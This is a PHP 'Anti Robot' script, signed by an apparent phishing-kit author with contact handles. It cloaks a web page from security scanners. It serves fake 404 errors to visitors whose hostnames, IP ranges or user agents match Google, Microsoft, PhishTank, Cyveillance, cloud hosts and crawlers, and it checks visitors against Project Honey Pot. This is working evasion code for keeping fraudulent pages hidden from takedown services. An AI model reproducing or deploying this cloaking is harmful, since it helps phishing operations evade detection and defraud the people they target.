<?php
/* 
// THIS SCRIPT CODED BY TOPFUD.com
// Skype : TOPFUD@hotmail.com ,, live:.cid.f3ca894e49395bbe
// ICQ : 624088694
/* Anti Robot */ 
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);$blocked_words = array("gmail","yandex","ymail","yahoo","icann","bot","Robot","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "microsoft");foreach($blocked_words as $word) {    if (substr_count($hostname, $word) > 0) {    header("HTTP/1.0 404 Not Found");        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");    }  }$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*","54.228.218.117","^54.228.218.*","185.28.20.243","^185.28.20.*","217.16.26.166","^217.16.26.*","^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
 "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*",
"^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
 "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
 "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
 "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
 "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
 "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
 "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
 "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
 "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
 "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*",
"^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*",
"^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*",
"^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
 "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*",
"^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
 "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*",
 "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
"^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
"^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
"^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
"^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
"^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
"^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
"^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
"^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135",
"^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
"^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
"^64.233.173.*" , "^64.68.90.*"
);if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {     header('HTTP/1.0 404 Not Found');     exit();} else {     foreach($bannedIP as $ip) {          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){               header('HTTP/1.0 404 Not Found');               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");          }     }}if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { header('HTTP/1.0 404 Not Found'); exit; }if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)){$ip=$_SERVER['HTTP_CLIENT_IP'];}else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) && filter_var($_SERVER['HTTP_X_FORWARDED_FOR'],FILTER_VALIDATE_IP)){$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];}else if(filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)){$ip=$_SERVER['REMOTE_ADDR'];}$timeout=5;$ch = curl_init();curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);curl_setopt($ch, CURLOPT_URL, "https://www.projecthoneypot.org/ip_$ip");$response=curl_exec($ch);curl_close($ch);$test1 = strpos($response, "This IP addresses has been seen by at least one Honey Pot");$test2 = strpos($response, "The Project Honey Pot system has detected behavior from the IP address");$test3 = strpos($response, "This IP has not seen any suspicious activity within the last");$test4 = strpos($response, "BingPreview");if ($test2==true || ($test1==true&&$test4==true )){header('HTTP/1.0 404 Not Found'); exit;
}
?>